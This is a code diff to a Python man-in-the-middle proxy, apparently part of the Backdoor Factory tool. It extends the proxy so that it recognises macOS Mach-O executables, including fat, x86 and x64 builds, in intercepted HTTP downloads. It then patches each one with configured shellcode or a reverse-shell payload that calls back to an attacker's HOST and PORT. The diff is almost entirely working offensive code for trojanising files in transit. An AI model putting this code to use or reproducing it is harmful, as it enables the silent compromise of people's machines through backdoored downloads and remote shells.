@@ -43,6 +43,7 @@ from tempfile import mkstemp
 import os
 from bdf import pebin
 from bdf import elfbin
+from bdf import machobin
 import string
 import random
 import zipfile
@@ -53,6 +54,7 @@ import logging
 import json
 import tarfile
 import tempfile
+
 
 try:
     from configobj import ConfigObj
@@ -116,7 +118,10 @@ class proxyMaster(controller.Master):
                              'gz': {'number': '1f8b'.decode('hex'), 'offset': 0},
                              'bz': {'number': 'BZ', 'offset': 0},
                              'zip': {'number': '504b0304'.decode('hex'), 'offset': 0},
-                             'tar': {'number': 'ustar', 'offset': 257}
+                             'tar': {'number': 'ustar', 'offset': 257},
+                             'fatfile': {'number': 'cafebabe'.decode('hex'), 'offset': 0},
+                             'machox64': {'number': 'cffaedfe'.decode('hex'), 'offset': 0},
+                             'machox86': {'number': 'cefaedfe'.decode('hex'), 'offset': 0},
                              }
 
     def run(self):
@@ -451,7 +456,7 @@ class proxyMaster(controller.Master):
                 targetFile.support_check()
 
                 if targetFile.class_type == 0x1:
-                    #x86
+                    #x86CPU Type
                     targetFile = elfbin.elfbin(FILE=binaryFile,
                                                OUTPUT=os.path.basename(binaryFile),
                                                SHELL=self.LinuxIntelx86['SHELL'],
@@ -473,6 +478,57 @@ class proxyMaster(controller.Master):
                                                )
                     result = targetFile.run_this()
 
+            elif binaryHeader[:4].encode('hex') in  ['cefaedfe', 'cffaedfe', 'cafebabe']: # Macho
+                targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
+                targetFile.support_check()
+
+                #ONE CHIP SET MUST HAVE PRIORITY in FAT FILE
+
+                if targetFile.FAT_FILE is True:
+                    if self.FatPriority == 'x86':
+                        targetFile = machobin.machobin(FILE=binaryFile,
+                                                   OUTPUT = os.path.basename(binaryFile),
+                                                   SHELL=self.MachoIntelx86['SHELL'],
+                                                   HOST=self.MachoIntelx86['HOST'],
+                                                   PORT=int(self.MachoIntelx86['PORT']),
+                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
+                                                   FAT_PRIORITY=self.FatPriority
+                                                   )
+                        result = targetFile.run_this()
+
+                    elif self.FatPriority == 'x64':
+                        targetFile = machobin.machobin(FILE=binaryFile,
+                                                   OUTPUT = os.path.basename(binaryFile),
+                                                   SHELL=self.MachoIntelx64['SHELL'],
+                                                   HOST=self.MachoIntelx64['HOST'],
+                                                   PORT=int(self.MachoIntelx64['PORT']),
+                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
+                                                   FAT_PRIORITY=self.FatPriority
+                                                   )
+                        result = targetFile.run_this()
+          
+                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7': 
+                    targetFile = machobin.machobin(FILE=binaryFile,
+                                                   OUTPUT = os.path.basename(binaryFile),
+                                                   SHELL=self.MachoIntelx86['SHELL'],
+                                                   HOST=self.MachoIntelx86['HOST'],
+                                                   PORT=int(self.MachoIntelx86['PORT']),
+                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
+                                                   FAT_PRIORITY=self.FatPriority
+                                                   )
+                    result = targetFile.run_this()
+
+                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007': 
+                    targetFile = machobin.machobin(FILE=binaryFile,
+                                                   OUTPUT = os.path.basename(binaryFile),
+                                                   SHELL=self.MachoIntelx64['SHELL'],
+                                                   HOST=self.MachoIntelx64['HOST'],
+                                                   PORT=int(self.MachoIntelx64['PORT']),
+                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
+                                                   FAT_PRIORITY=self.FatPriority
+                                                   )
+                    result = targetFile.run_this()
+          
             return result
 
         except Exception as e:
@@ -620,7 +676,7 @@ class proxyMaster(controller.Master):
 
                 if target in flow.request.host: 
                     self.parse_target_config(self.userConfig['targets'][target])
-
+                
         except Exception as e:
             print "[!] YOUR CONFIG IS BROKEN:", str(e)
             logging.warning("[!] YOUR CONFIG IS BROKEN %s", str(e))
@@ -662,7 +718,9 @@ class proxyMaster(controller.Master):
                     aZipFile = flow.reply.obj.response.content
                     flow.reply.obj.response.content = self.zip_files(aZipFile)
 
-            elif self.bytes_have_format(flow.reply.obj.response.content, 'pe') or self.bytes_have_format(flow.reply.obj.response.content, 'elf'):
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'pe') or self.bytes_have_format(flow.reply.obj.response.content, 'elf') or \
+                self.bytes_have_format(flow.reply.obj.response.content, 'fatfile') or self.bytes_have_format(flow.reply.obj.response.content, 'machox86') or \
+                self.bytes_have_format(flow.reply.obj.response.content, 'machox64'):             
 
                 orgFile = flow.reply.obj.response.content
 
